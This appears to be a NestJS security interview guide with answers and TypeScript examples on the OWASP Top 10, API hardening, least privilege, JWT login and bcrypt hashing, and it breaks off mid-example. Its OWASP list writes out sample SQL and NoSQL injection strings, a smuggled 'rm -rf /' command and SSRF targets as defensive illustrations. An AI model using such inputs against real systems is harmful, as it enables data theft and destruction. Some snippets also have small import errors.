# NestJS Security Best Practices - Top Interview Questions

## Security Fundamentals

1. What are the OWASP Top 10 security risks?

<details>
<summary><strong>Answer</strong></summary>

**OWASP Top 10** (2021): **1) Broken Access Control**, **2) Cryptographic Failures**, **3) Injection**, **4) Insecure Design**, **5) Security Misconfiguration**, **6) Vulnerable Components**, **7) Authentication Failures**, **8) Software/Data Integrity Failures**, **9) Logging/Monitoring Failures**, **10) SSRF**. **NestJS Protection**: Guards for access control, bcrypt for passwords, TypeORM prevents injection, ValidationPipe for input validation, Helmet for headers, rate limiting, JWT auth.

```typescript
// OWASP Top 10 (2021) - Complete List
const owaspTop10 = {
  1: {
    name: 'A01:2021 – Broken Access Control',
    description: 'Users can access resources they shouldn\'t',
    examples: [
      'Access other users\' data by changing URL (/users/123 → /users/456)',
      'Privilege escalation (regular user → admin)',
      'Missing authorization checks',
    ],
    nestjsPrevention: [
      'Use Guards (@UseGuards(AuthGuard, RolesGuard))',
      'Implement RBAC (Role-Based Access Control)',
      'Check user permissions before data access',
    ],
  },
  2: {
    name: 'A02:2021 – Cryptographic Failures',
    description: 'Weak encryption, plaintext sensitive data',
    examples: [
      'Passwords stored in plaintext',
      'HTTP instead of HTTPS',
      'Weak hashing algorithms (MD5, SHA1)',
    ],
    nestjsPrevention: [
      'Use bcrypt/argon2 for passwords (10+ rounds)',
      'HTTPS in production (SSL/TLS)',
      'Encrypt sensitive DB fields (AES-256)',
    ],
  },
  3: {
    name: 'A03:2021 – Injection',
    description: 'SQL injection, NoSQL injection, command injection',
    examples: [
      'SQL: \' OR 1=1 --',
      'NoSQL: { $gt: "" }',
      'Command: ; rm -rf /',
    ],
    nestjsPrevention: [
      'Use TypeORM (parameterized queries)',
      'ValidationPipe with class-validator',
      'Never use raw queries with user input',
    ],
  },
  4: {
    name: 'A04:2021 – Insecure Design',
    description: 'Missing security requirements in design',
    examples: [
      'No rate limiting (DDoS vulnerable)',
      'Unlimited file uploads',
      'No input validation',
    ],
    nestjsPrevention: [
      'Rate limiting (@nestjs/throttler)',
      'File size limits (express-fileupload)',
      'Security by design (threat modeling)',
    ],
  },
  5: {
    name: 'A05:2021 – Security Misconfiguration',
    description: 'Default configs, verbose errors, unnecessary features',
    examples: [
      'Debug mode in production',
      'Default admin/admin credentials',
      'Stack traces exposed to users',
    ],
    nestjsPrevention: [
      'Disable debug in prod (NODE_ENV=production)',
      'Use Helmet for security headers',
      'Custom error messages (hide stack traces)',
    ],
  },
  6: {
    name: 'A06:2021 – Vulnerable and Outdated Components',
    description: 'Using libraries with known vulnerabilities',
    examples: [
      'Old Express version with CVEs',
      'Vulnerable npm packages',
      'Unpatched dependencies',
    ],
    nestjsPrevention: [
      'npm audit fix (regular audits)',
      'Dependabot/Renovate (auto-updates)',
      'Snyk for vulnerability scanning',
    ],
  },
  7: {
    name: 'A07:2021 – Identification and Authentication Failures',
    description: 'Weak authentication, session management issues',
    examples: [
      'No password complexity requirements',
      'Session fixation',
      'Missing multi-factor authentication',
    ],
    nestjsPrevention: [
      'Strong password policy (class-validator)',
      'JWT with short expiry (15 min access, 7 day refresh)',
      'Implement MFA (2FA)',
    ],
  },
  8: {
    name: 'A08:2021 – Software and Data Integrity Failures',
    description: 'Insecure CI/CD, auto-updates without verification',
    examples: [
      'Unsigned packages',
      'Insecure deserialization',
      'Compromised build pipeline',
    ],
    nestjsPrevention: [
      'Verify package integrity (lock files)',
      'Signed commits/releases',
      'Secure CI/CD pipeline',
    ],
  },
  9: {
    name: 'A09:2021 – Security Logging and Monitoring Failures',
    description: 'Insufficient logging, no alerting',
    examples: [
      'No login attempt logging',
      'Missing audit trails',
      'No alerting on suspicious activity',
    ],
    nestjsPrevention: [
      'Winston/Pino for structured logging',
      'Log failed auth attempts',
      'Monitoring (Datadog, Sentry)',
    ],
  },
  10: {
    name: 'A10:2021 – Server-Side Request Forgery (SSRF)',
    description: 'App fetches remote resource without validation',
    examples: [
      'Fetch http://localhost:9000/admin',
      'Access internal services',
      'Read cloud metadata (169.254.169.254)',
    ],
    nestjsPrevention: [
      'Whitelist allowed domains',
      'Validate URLs before fetching',
      'Use VPC/firewall to restrict internal access',
    ],
  },
};

// NestJS Security Implementation Example
import { Controller, Get, UseGuards, ValidationPipe } from '@nestjs/common';
import { ThrottleGuard } from '@nestjs/throttler';
import { JwtAuthGuard } from './auth/jwt-auth.guard';
import { RolesGuard } from './auth/roles.guard';
import { Roles } from './auth/roles.decorator';

@Controller('users')
@UseGuards(JwtAuthGuard, RolesGuard, ThrottleGuard) // A01, A07, A04
export class UsersController {
  @Get()
  @Roles('admin') // A01: Access Control
  async findAll() {
    // Only admins can access
    return this.usersService.findAll();
  }
  
  @Post()
  @UsePipes(new ValidationPipe({ // A03: Injection Prevention
    whitelist: true,              // Strip unknown properties
    forbidNonWhitelisted: true,   // Reject if unknown properties
    transform: true,
  }))
  async create(@Body() createUserDto: CreateUserDto) {
    // Input validated by class-validator
    return this.usersService.create(createUserDto);
  }
}
```

**Interview Tip**: **Top 3**: Broken Access Control (use Guards + RBAC), Cryptographic Failures (bcrypt + HTTPS), Injection (TypeORM + ValidationPipe). **NestJS mitigations**: Guards for auth/authz, ValidationPipe for input, TypeORM prevents SQL injection, Helmet for headers, @nestjs/throttler for rate limiting, bcrypt for passwords. **Production**: Regular npm audit, HTTPS, logging, monitoring, security headers.

</details>

2. What security considerations are important for APIs?

<details>
<summary><strong>Answer</strong></summary>

**API Security**: **Authentication** (JWT, API keys), **Authorization** (RBAC, permissions), **Input validation** (ValidationPipe), **Rate limiting** (prevent abuse), **CORS** (restrict origins), **HTTPS** (encrypt transit), **Security headers** (Helmet), **Error handling** (no stack traces), **Logging** (audit trails). **Production**: All combined + monitoring + regular security audits.

```typescript
// Comprehensive API Security Setup
// main.ts
import { NestFactory } from '@nestjs/core';
import { ValidationPipe } from '@nestjs/common';
import * as helmet from 'helmet';
import * as compression from 'compression';
import { AppModule } from './app.module';

async function bootstrap() {
  const app = await NestFactory.create(AppModule);
  
  // 1. Security Headers (Helmet)
  app.use(helmet({
    contentSecurityPolicy: {
      directives: {
        defaultSrc: ["'self'"],
        styleSrc: ["'self'", "'unsafe-inline'"],
        scriptSrc: ["'self'"],
        imgSrc: ["'self'", 'data:', 'https:'],
      },
    },
    hsts: {
      maxAge: 31536000,
      includeSubDomains: true,
      preload: true,
    },
  }));
  
  // 2. CORS (Restrict origins)
  app.enableCors({
    origin: process.env.ALLOWED_ORIGINS?.split(',') || 'https://yourdomain.com',
    credentials: true,
    methods: ['GET', 'POST', 'PUT', 'DELETE', 'PATCH'],
    allowedHeaders: ['Content-Type', 'Authorization'],
  });
  
  // 3. Input Validation (Global)
  app.useGlobalPipes(
    new ValidationPipe({
      whitelist: true,              // Remove unknown properties
      forbidNonWhitelisted: true,   // Reject if unknown properties
      transform: true,              // Transform to DTO types
      disableErrorMessages: process.env.NODE_ENV === 'production', // Hide details in prod
    }),
  );
  
  // 4. Compression (Optional, but recommended)
  app.use(compression());
  
  // 5. Listen (HTTPS in production)
  await app.listen(process.env.PORT || 3000);
  
  console.log(`🔒 Secure API running on ${await app.getUrl()}`);
}
bootstrap();

// app.module.ts
import { Module } from '@nestjs/common';
import { ConfigModule } from '@nestjs/config';
import { ThrottlerModule, ThrottlerGuard } from '@nestjs/throttler';
import { APP_GUARD } from '@nestjs/core';

@Module({
  imports: [
    ConfigModule.forRoot({
      isGlobal: true,
      // Never commit .env to git!
    }),
    
    // Rate Limiting (Prevent abuse)
    ThrottlerModule.forRoot([{
      ttl: 60000,   // 60 seconds
      limit: 100,   // 100 requests per 60 seconds
    }]),
  ],
  providers: [
    // Apply rate limiting globally
    {
      provide: APP_GUARD,
      useClass: ThrottlerGuard,
    },
  ],
})
export class AppModule {}

// API Security Checklist
const apiSecurityChecklist = {
  authentication: {
    check: '✅ JWT with secure secrets',
    implementation: '@nestjs/jwt + bcrypt',
    config: {
      accessTokenExpiry: '15m',
      refreshTokenExpiry: '7d',
      jwtSecret: process.env.JWT_SECRET, // Strong random string
    },
  },
  authorization: {
    check: '✅ RBAC (Role-Based Access Control)',
    implementation: 'Guards + @Roles() decorator',
    example: '@Roles("admin", "moderator")',
  },
  inputValidation: {
    check: '✅ ValidationPipe + class-validator',
    implementation: 'DTOs with decorators',
    options: {
      whitelist: true,
      forbidNonWhitelisted: true,
      transform: true,
    },
  },
  rateLimiting: {
    check: '✅ @nestjs/throttler',
    limits: {
      general: '100 req/min',
      auth: '10 req/min',
      strict: '5 req/min',
    },
  },
  cors: {
    check: '✅ Restricted origins',
    config: {
      origin: 'https://yourdomain.com', // NOT '*'
      credentials: true,
    },
  },
  https: {
    check: '✅ HTTPS/TLS in production',
    implementation: 'SSL certificate (Let\'s Encrypt, AWS ACM)',
  },
  securityHeaders: {
    check: '✅ Helmet middleware',
    headers: [
      'Content-Security-Policy',
      'X-Frame-Options: DENY',
      'X-Content-Type-Options: nosniff',
      'Strict-Transport-Security',
    ],
  },
  errorHandling: {
    check: '✅ Custom error messages',
    production: 'Hide stack traces',
    logging: 'Log errors to monitoring service',
  },
  logging: {
    check: '✅ Audit trails',
    log: [
      'Failed auth attempts',
      'Unauthorized access attempts',
      'Data modifications',
      'Rate limit violations',
    ],
  },
  dependencies: {
    check: '✅ Regular security audits',
    tools: ['npm audit', 'Snyk', 'Dependabot'],
    frequency: 'Weekly',
  },
};

// Example: Secure Controller
import { Controller, Get, Post, Body, UseGuards, Request } from '@nestjs/common';
import { JwtAuthGuard } from './auth/jwt-auth.guard';
import { RolesGuard } from './auth/roles.guard';
import { Roles } from './auth/roles.decorator';
import { Throttle } from '@nestjs/throttler';
import { CreateUserDto } from './dto/create-user.dto';

@Controller('api/users')
@UseGuards(JwtAuthGuard, RolesGuard) // Authentication + Authorization
export class UsersController {
  constructor(private readonly usersService: UsersService) {}
  
  // Read: Higher rate limit
  @Get()
  @Throttle({ default: { limit: 100, ttl: 60000 } })
  async findAll(@Request() req) {
    // Only authenticated users
    return this.usersService.findAll();
  }
  
  // Admin only: Strict access control
  @Get('admin')
  @Roles('admin')
  @Throttle({ default: { limit: 50, ttl: 60000 } })
  async getAdminData() {
    return this.usersService.getAdminData();
  }
  
  // Write: Strict rate limit
  @Post()
  @Throttle({ default: { limit: 10, ttl: 60000 } })
  async create(@Body() createUserDto: CreateUserDto) {
    // Input validated by ValidationPipe
    return this.usersService.create(createUserDto);
  }
}

// Example: Secure DTO with Validation
import { IsEmail, IsString, MinLength, MaxLength, Matches } from 'class-validator';

export class CreateUserDto {
  @IsEmail()
  email: string;
  
  @IsString()
  @MinLength(8)
  @MaxLength(100)
  @Matches(/^(?=.*[a-z])(?=.*[A-Z])(?=.*\d)(?=.*[@$!%*?&])[A-Za-z\d@$!%*?&]/, {
    message: 'Password must contain uppercase, lowercase, number, and special character',
  })
  password: string;
  
  @IsString()
  @MinLength(2)
  @MaxLength(50)
  name: string;
}
```

**Interview Tip**: **Essential**: Authentication (JWT), Authorization (Guards + RBAC), Input validation (ValidationPipe + class-validator), Rate limiting (@nestjs/throttler), CORS (restrict origins), HTTPS (production), Security headers (Helmet). **Best practices**: No sensitive data in logs, custom error messages (hide stack traces), regular npm audit, monitoring (Datadog/Sentry). **Production**: All combined + WAF + DDoS protection.

</details>

3. What is the principle of least privilege?

<details>
<summary><strong>Answer</strong></summary>

**Least Privilege**: Grant users/services **only minimum permissions** needed to perform tasks. **Benefits**: Limits damage from compromised accounts, prevents privilege escalation, reduces attack surface. **Implementation**: RBAC, scoped JWT tokens, database user permissions, IAM roles. **Example**: Regular user can't access admin endpoints, read-only API key can't write data.

```typescript
// Principle of Least Privilege - Implementation

// 1. Role-Based Access Control (RBAC)
export enum UserRole {
  USER = 'user',           // Minimal permissions
  MODERATOR = 'moderator', // Some admin capabilities
  ADMIN = 'admin',         // Full access
  SUPER_ADMIN = 'super_admin', // All permissions
}

// 2. Roles Decorator
import { SetMetadata } from '@nestjs/common';

export const ROLES_KEY = 'roles';
export const Roles = (...roles: UserRole[]) => SetMetadata(ROLES_KEY, roles);

// 3. Roles Guard (Enforces Least Privilege)
import { Injectable, CanActivate, ExecutionContext } from '@nestjs/common';
import { Reflector } from '@nestjs/core';

@Injectable()
export class RolesGuard implements CanActivate {
  constructor(private reflector: Reflector) {}

  canActivate(context: ExecutionContext): boolean {
    const requiredRoles = this.reflector.getAllAndOverride<UserRole[]>(ROLES_KEY, [
      context.getHandler(),
      context.getClass(),
    ]);
    
    // No roles required - allow access
    if (!requiredRoles) {
      return true;
    }
    
    const { user } = context.switchToHttp().getRequest();
    
    // Check if user has ANY of the required roles
    return requiredRoles.some((role) => user.roles?.includes(role));
  }
}

// 4. Controller with Least Privilege
import { Controller, Get, Post, Delete, UseGuards } from '@nestjs/common';
import { JwtAuthGuard } from './guards/jwt-auth.guard';
import { RolesGuard } from './guards/roles.guard';
import { Roles } from './decorators/roles.decorator';

@Controller('posts')
@UseGuards(JwtAuthGuard, RolesGuard)
export class PostsController {
  // Anyone authenticated can read
  @Get()
  findAll() {
    return this.postsService.findAll();
  }
  
  // Only users can create (not guests)
  @Post()
  @Roles(UserRole.USER, UserRole.MODERATOR, UserRole.ADMIN)
  create(@Body() createPostDto: CreatePostDto) {
    return this.postsService.create(createPostDto);
  }
  
  // Only moderators/admins can delete
  @Delete(':id')
  @Roles(UserRole.MODERATOR, UserRole.ADMIN)
  remove(@Param('id') id: string) {
    return this.postsService.remove(id);
  }
  
  // Only super admins can purge
  @Delete('purge')
  @Roles(UserRole.SUPER_ADMIN)
  purgeAll() {
    return this.postsService.purgeAll();
  }
}

// 5. JWT with Minimal Claims (Don't over-share)
export class AuthService {
  async login(user: User) {
    const payload = {
      sub: user.id,
      email: user.email,
      roles: user.roles, // Only include necessary info
      // ❌ Don't include: password, credit card, SSN, etc.
    };
    
    return {
      access_token: this.jwtService.sign(payload),
    };
  }
}

// 6. Database - Least Privilege
// Create separate DB users with minimal permissions

/*
-- Read-only user (for reporting)
CREATE USER 'app_readonly'@'localhost' IDENTIFIED BY 'password';
GRANT SELECT ON mydb.* TO 'app_readonly'@'localhost';

-- App user (no DROP, no admin)
CREATE USER 'app_user'@'localhost' IDENTIFIED BY 'password';
GRANT SELECT, INSERT, UPDATE, DELETE ON mydb.* TO 'app_user'@'localhost';

-- Admin user (all permissions)
CREATE USER 'app_admin'@'localhost' IDENTIFIED BY 'password';
GRANT ALL PRIVILEGES ON mydb.* TO 'app_admin'@'localhost';
*/

// TypeORM Connection with Specific User
import { TypeOrmModuleOptions } from '@nestjs/typeorm';

export const typeOrmConfig: TypeOrmModuleOptions = {
  type: 'mysql',
  host: process.env.DB_HOST,
  port: parseInt(process.env.DB_PORT),
  username: process.env.DB_USER, // Use app_user (not root!)
  password: process.env.DB_PASSWORD,
  database: process.env.DB_NAME,
  entities: [__dirname + '/**/*.entity{.ts,.js}'],
  synchronize: false, // Never true in production
};

// 7. Resource-Level Access Control
@Injectable()
export class PostsService {
  async findOne(id: string, userId: string, userRoles: string[]) {
    const post = await this.postsRepository.findOne({ where: { id } });
    
    if (!post) {
      throw new NotFoundException('Post not found');
    }
    
    // User can only access their own posts (unless admin/moderator)
    const isAdmin = userRoles.includes(UserRole.ADMIN) || 
                    userRoles.includes(UserRole.MODERATOR);
    
    if (post.authorId !== userId && !isAdmin) {
      throw new ForbiddenException('Access denied');
    }
    
    return post;
  }
}

// 8. API Keys with Scopes (For External Integrations)
export interface ApiKey {
  key: string;
  scopes: string[]; // ['read:posts', 'write:posts']
  expiresAt: Date;
}

@Injectable()
export class ApiKeyGuard implements CanActivate {
  canActivate(context: ExecutionContext): boolean {
    const request = context.switchToHttp().getRequest();
    const apiKey = request.headers['x-api-key'];
    
    const keyData = this.apiKeyService.validate(apiKey);
    if (!keyData) {
      throw new UnauthorizedException('Invalid API key');
    }
    
    // Check scope
    const requiredScope = this.reflector.get('apiScope', context.getHandler());
    if (requiredScope && !keyData.scopes.includes(requiredScope)) {
      throw new ForbiddenException('Insufficient permissions');
    }
    
    return true;
  }
}

// 9. Example: Different API Keys for Different Purposes
const apiKeys = {
  readOnly: {
    key: 'rk_live_abc123',
    scopes: ['read:posts', 'read:users'],
    description: 'Can only read data',
  },
  readWrite: {
    key: 'rw_live_xyz789',
    scopes: ['read:posts', 'write:posts', 'read:users'],
    description: 'Can read and write posts',
  },
  admin: {
    key: 'admin_live_def456',
    scopes: ['*'], // All permissions
    description: 'Full access',
  },
};

// 10. Least Privilege Checklist
const leastPrivilegeChecklist = {
  users: {
    principle: 'Grant minimum role needed',
    examples: [
      '✅ Regular users can only access their own data',
      '✅ Moderators can moderate content',
      '✅ Admins can manage users',
      '❌ Don\'t give everyone admin access',
    ],
  },
  jwt: {
    principle: 'Include only necessary claims',
    examples: [
      '✅ Include: user ID, email, roles',
      '❌ Don\'t include: password, credit card, SSN',
    ],
  },
  database: {
    principle: 'Use DB users with minimal permissions',
    examples: [
      '✅ App uses user with SELECT/INSERT/UPDATE/DELETE',
      '❌ App doesn\'t use root user',
      '✅ Read-only reporting uses SELECT-only user',
    ],
  },
  apiKeys: {
    principle: 'Scope API keys to specific operations',
    examples: [
      '✅ Analytics API key: read-only',
      '✅ Integration API key: read + write specific resources',
      '❌ Don\'t use same key for everything',
    ],
  },
  services: {
    principle: 'Microservices have minimal permissions',
    examples: [
      '✅ Payment service can only access payment DB',
      '✅ Auth service can only access user DB',
      '❌ Services don\'t share credentials',
    ],
  },
  cloud: {
    principle: 'Use IAM roles with minimal permissions',
    examples: [
      '✅ EC2 instance has S3 read-only role',
      '✅ Lambda has specific DynamoDB permissions',
      '❌ Don\'t use root AWS credentials',
    ],
  },
};
```

**Interview Tip**: **Definition**: Grant minimum permissions needed to perform tasks. **Why**: Limits damage from compromised accounts, prevents privilege escalation, reduces attack surface. **Implementation**: RBAC (Guards + @Roles()), scoped JWT tokens (only necessary claims), database users (not root), API keys with scopes. **Example**: Regular user can't delete others' posts, read-only API key can't write. **Production**: Resource-level checks (user can only access their own data unless admin), separate DB users per environment, IAM roles in cloud.

</details>

## Authentication & Authorization

4. How do you implement secure authentication in NestJS?

<details>
<summary><strong>Answer</strong></summary>

**Secure Authentication**: Use **@nestjs/jwt + @nestjs/passport** with **bcrypt** for password hashing. **Flow**: User logs in → validate credentials → hash password → generate JWT → return tokens. **Security**: Strong JWT secrets, short token expiry, httpOnly cookies, refresh tokens. **Production**: Add rate limiting, account lockout, MFA, audit logging.

```typescript
// Complete Secure Authentication Implementation

// 1. Install Dependencies
/*
npm install @nestjs/jwt @nestjs/passport passport passport-jwt bcrypt
npm install -D @types/passport-jwt @types/bcrypt
*/

// 2. User Entity (with Password Hashing)
import { Entity, Column, PrimaryGeneratedColumn, BeforeInsert } from 'typeorm';
import * as bcrypt from 'bcrypt';

@Entity('users')
export class User {
  @PrimaryGeneratedColumn('uuid')
  id: string;

  @Column({ unique: true })
  email: string;

  @Column()
  password: string; // Hashed password

  @Column({ default: 'user' })
  role: string;

  @Column({ default: 0 })
  loginAttempts: number;

  @Column({ type: 'timestamp', nullable: true })
  lockedUntil: Date;

  // Hash password before saving
  @BeforeInsert()
  async hashPassword() {
    if (this.password) {
      const salt = await bcrypt.genSalt(10);
      this.password = await bcrypt.hash(this.password, salt);
    }
  }

  // Validate password
  async validatePassword(password: string): Promise<boolean> {
    return bcrypt.compare(password, this.password);
  }
}

// 3. JWT Strategy
import { Injectable, UnauthorizedException } from '@nestjs/common';
import { PassportStrategy } from '@nestjs/passport';
import { ExtractJwt, Strategy } from 'passport-jwt';
import { ConfigService } from '@nestjs/config';

@Injectable()
export class JwtStrategy extends PassportStrategy(Strategy) {
  constructor(
    private configService: ConfigService,
    private usersService: UsersService,
  ) {
    super({
      jwtFromRequest: ExtractJwt.fromAuthHeaderAsBearerToken(),
      ignoreExpiration: false,
      secretOrKey: configService.get('JWT_SECRET'),
    });
  }

  async validate(payload: any) {
    const user = await this.usersService.findById(payload.sub);
    if (!user) {
      throw new UnauthorizedException('User not found');
    }
    return { userId: payload.sub, email: payload.email, roles: payload.roles };
  }
}

// 4. Auth Service (Login Logic)
import { Injectable, UnauthorizedException } from '@nestjs/common';
import { JwtService } from '@nestjs/jwt';
import { UsersService } from '../users/users.service';
import * as bcrypt from 'bcrypt';

@Injectable()
export class AuthService {
  constructor(
    private usersService: UsersService,
    private jwtService: JwtService,
  ) {}

  async validateUser(email: string, password: string): Promise<any> {
    const user = await this.usersService.findByEmail(email);
    
    if (!user) {
      throw new UnauthorizedException('Invalid credentials');
    }

    // Check if account is locked
    if (user.lockedUntil && user.lockedUntil > new Date()) {
      throw new UnauthorizedException('Account is locked. Try again later.');
    }

    // Validate password
    const isPasswordValid = await user.validatePassword(password);
    
    if (!isPasswordValid) {
      // Increment failed login attempts
      await this.usersService.incrementLoginAttempts(user.id);
      throw new UnauthorizedException('Invalid credentials');
    }

    // Reset login attempts on successful login
    await this.usersService.resetLoginAttempts(user.id);

    return user;
  }

  async login(user: User) {
    const payload = { 
      email: user.email, 
      sub: user.id, 
      roles: [user.role] 
    };

    return {
      access_token: this.jwtService.sign(payload, { expiresIn: '15m' }),
      refresh_token: this.jwtService.sign(payload, { expiresIn: '7d' }),
    };
  }

  async register(createUserDto: CreateUserDto) {
    // Check if user exists
    const existingUser = await this.usersService.findByEmail(createUserDto.email);
    if (existingUser) {
      throw new ConflictException('User already exists');
    }

    // Create user (password will be hashed automatically)
    const user = await this.usersService.create(createUserDto);

    return this.login(user);
  }

  async refreshToken(refreshToken: string) {
    try {
      const payload = this.jwtService.verify(refreshToken);
      const user = await this.usersService.findById(payload.sub);

      if (!user) {
        throw new UnauthorizedException('Invalid token');
      }

      return this.login(user);
    } catch (error) {
      throw new UnauthorizedException('Invalid refresh token');
    }
  }
}

// 5. Auth Controller
import { Controller, Post, Body, UseGuards, Request, HttpCode } from '@nestjs/common';
import { AuthService } from './auth.service';
import { LocalAuthGuard } from './guards/local-auth.guard';
import { Throttle } from '@nestjs/throttler';

@Controller('auth')
export class AuthController {
  constructor(private authService: AuthService) {}

  @Post('register')
  @Throttle({ default: { limit: 5, ttl: 60000 } }) // 5 requests per minute
  async register(@Body() createUserDto: CreateUserDto) {
    return this.authService.register(createUserDto);
  }

  @Post('login')
  @Throttle({ default: { limit: 10, ttl: 60000 } }) // 10 requests per minute
  @HttpCode(200)
  async login(@Body() loginDto: LoginDto) {
    const user = await this.authService.validateUser(
      loginDto.email,
      loginDto.password,
    );
    return this.authService.login(user);
  }

  @Post('refresh')
  @Throttle({ default: { limit: 20, ttl: 60000 } })
  async refresh(@Body() refreshDto: RefreshTokenDto) {
    return this.authService.refreshToken(refreshDto.refresh_token);
  }

  @Post('logout')
  @UseGuards(JwtAuthGuard)
  async logout(@Request() req) {
    // Implement token blacklist if needed
    return { message: 'Logged out successfully' };
  }
}

// 6. DTOs with Validation
import { IsEmail, IsString, MinLength, MaxLength, Matches } from 'class-validator';

export class CreateUserDto {
  @IsEmail()
  email: string;

  @IsString()
  @MinLength(8)
  @MaxLength(100)
  @Matches(/^(?=.*[a-z])(?=.*[A-Z])(?=.*\d)(?=.*[@$!%*?&])[A-Za-z\d@$!%*?&]/, {
    message: 'Password must contain uppercase, lowercase, number, and special character',
  })
  password: string;
}

export class LoginDto {
  @IsEmail()
  email: string;

  @IsString()
  password: string;
}

// 7. Auth Module
import { Module } from '@nestjs/common';
import { JwtModule } from '@nestjs/jwt';
import { PassportModule } from '@nestjs/passport';
import { ConfigModule, ConfigService } from '@nestjs/config';
import { AuthService } from './auth.service';
import { AuthController } from './auth.controller';
import { JwtStrategy } from './strategies/jwt.strategy';

@Module({
  imports: [
    PassportModule,
    JwtModule.registerAsync({
      imports: [ConfigModule],
      useFactory: async (configService: ConfigService) => ({
        secret: configService.get('JWT_SECRET'),
        signOptions: { expiresIn: '15m' },
      }),
      inject: [ConfigService],
    }),
  ],
  providers: [AuthService, JwtStrategy],
  controllers: [AuthController],
  exports: [AuthService],
})
export class AuthModule {}

// 8. Environment Variables (.env)
/*
JWT_SECRET=your-super-secret-jwt-key-min-32-chars-long-random-string
JWT_EXPIRES_IN=15m
JWT_REFRESH_EXPIRES_IN=7d
*/

// 9. Protected Route Example
import { Controller, Get, UseGuards } from '@nestjs/common';
import { JwtAuthGuard } from './guards/jwt-auth.guard';

@Controller('profile')
export class ProfileController {
  @Get()
  @UseGuards(JwtAuthGuard)
  getProfile(@Request() req) {
    return req.user; // User from JWT payload
  }
}

// 10. Security Best Practices Checklist
const authSecurityChecklist = {
  passwordHashing: {
    ✅: 'bcrypt with 10+ rounds',
    ❌: 'Plaintext, MD5, SHA1',
  },
  jwtSecret: {
    ✅: 'Long random string (32+ chars)',
    ❌: 'Short or predictable secret',
  },
  tokenExpiry: {
    ✅: 'Access: 15min, Refresh: 7 days',
    ❌: 'Never expires',
  },
  rateLimiting: {
    ✅: 'Login: 10 req/min, Register: 5 req/min',
    ❌: 'No rate limiting',
  },
  accountLockout: {
    ✅: 'Lock after 5 failed attempts',
    ❌: 'Unlimited attempts',
  },
  https: {
    ✅: 'HTTPS in production',
    ❌: 'HTTP',
  },
  httpOnlyCookies: {
    ✅: 'Store tokens in httpOnly cookies',
    ❌: 'localStorage (XSS vulnerable)',
  },
  validation: {
    ✅: 'Strong password policy',
    ❌: 'Any password accepted',
  },
};
```

**Interview Tip**: **Core**: @nestjs/jwt + @nestjs/passport + bcrypt. **Flow**: User logs in → validate password (bcrypt.compare) → generate JWT → return access + refresh tokens. **Security**: Strong JWT secret (32+ chars random), short expiry (15m access, 7d refresh), bcrypt with 10+ rounds, rate limiting (10 login/min), account lockout (5 failed attempts). **Storage**: httpOnly cookies (XSS protection) or Authorization header. **Production**: Add MFA, audit logging, token blacklist for logout, HTTPS only.

</details>

4. How do you implement secure authentication?
5. How do you hash passwords securely using bcrypt?

<details>
<summary><strong>Answer</strong></summary>

**Bcrypt Hashing**: Use **bcrypt** library to hash passwords with **salt rounds (10+)**. **Why**: Bcrypt is slow (intentional), making brute-force attacks impractical. **Implementation**: Hash on registration, compare on login. **Security**: Never store plaintext passwords, use 10-12 rounds (higher = slower but more secure). **Production**: Use bcrypt or argon2, never MD5/SHA1.

```typescript
// Secure Password Hashing with Bcrypt

// 1. Install bcrypt
/*
npm install bcrypt
npm install -D @types/bcrypt
*/

// 2. Hash Password (Registration)
import * as bcrypt from 'bcrypt';

export class AuthService {
  async hashPassword(password: string): Promise<string> {
    const saltRounds = 10; // Higher = more secure but slower (10-12 recommended)
    const salt = await bcrypt.genSalt(saltRounds);
    const hashedPassword = await bcrypt.hash(password, salt);
    return hashedPassword;
  }

  // Alternative: One-step hashing
  async hashPasswordSimple(password: string): Promise<string> {
    return bcrypt.hash(password, 10); // Salt automatically generated
  }
}

// 3. Verify Password (Login)
export class AuthService {
  async validatePassword(plainPassword: string, hashedPassword: string): Promise<boolean> {
    return bcrypt.compare(plainPassword, hashedPassword);
  }
}

// 4. Complete User Entity with Auto-Hashing
import { Entity, Column, PrimaryGeneratedColumn, BeforeInsert, BeforeUpdate } from 'typeorm';
import * as bcrypt from 'bcrypt';

@Entity('users')
export class User {
  @PrimaryGeneratedColumn('uuid')
  id: string;

  @Column({ unique: true })
  email: string;

  @Column()
  password: string; // This will be hashed

  @Column({ default: 'user' })
  role: string;

  // Hash password before saving to database
  @BeforeInsert()
  @BeforeUpdate()
  async hashPassword() {
    // Only hash if password was modified
    if (this.password && !this.password.startsWith('$2b$')) {
      const salt = await bcrypt.genSalt(10);
      this.password = await bcrypt.hash(this.password, salt);
    }
  }

  // Method to validate password
  async validatePassword(password: string): Promise<boolean> {
    return bcrypt.compare(password, this.password);
  }
}

// 5. Registration Flow
export class UsersService {
  async register(createUserDto: CreateUserDto): Promise<User> {
    // Create user entity
    const user = this.usersRepository.create({
      email: createUserDto.email,
      password: createUserDto.password, // Will be hashed by @BeforeInsert
    });

    // Save (password automatically hashed)
    return this.usersRepository.save(user);
  }
}

// 6. Login Flow
export class AuthService {
  async validateUser(email: string, password: string): Promise<User> {
    const user = await this.usersService.findByEmail(email);
    
    if (!user) {
      throw new UnauthorizedException('Invalid credentials');
    }

    // Compare plain password with hashed password
    const isPasswordValid = await user.validatePassword(password);
    
    if (!isPasswordValid) {
      throw new UnauthorizedException('Invalid credentials');
    }

    return user;
  }

  async login(user: User) {
    const payload = { email: user.email, sub: user.id, roles: [user.role] };
    return {
      access_token: this.jwtService.sign(payload),
    };
  }
}

// 7. Bcrypt Configuration Examples
const bcryptExamples = {
  // Different salt rounds (higher = slower)
  fast: {
    rounds: 8,
    time: '~40ms per hash',
    use: 'Development/testing',
  },
  recommended: {
    rounds: 10,
    time: '~100ms per hash',
    use: 'Production (default)',
  },
  secure: {
    rounds: 12,
    time: '~300ms per hash',
    use: 'High-security applications',
  },
  verysecure: {
    rounds: 14,
    time: '~1000ms per hash',
    use: 'Extremely sensitive data',
  },
};

// Example: Hash with different rounds
async function demonstrateSaltRounds() {
  const password = 'MySecurePassword123!';
  
  console.time('8 rounds');
  await bcrypt.hash(password, 8);
  console.timeEnd('8 rounds'); // ~40ms
  
  console.time('10 rounds');
  await bcrypt.hash(password, 10);
  console.timeEnd('10 rounds'); // ~100ms
  
  console.time('12 rounds');
  await bcrypt.hash(password, 12);
  console.timeEnd('12 rounds'); // ~300ms
}

// 8. Bcrypt Hash Format
const bcryptHashExample = {
  hash: '$2b$10$N9qo8uLOickgx2ZMRZoMye/IcZiIJ.UHypX1UYqc3vO6KJz5/.h1y',
  parts: {
    $2b: 'Algorithm identifier (bcrypt)',
    $10: 'Salt rounds (cost factor)',
    'N9qo8uLOickgx2ZMRZoMye': 'Salt (22 characters)',
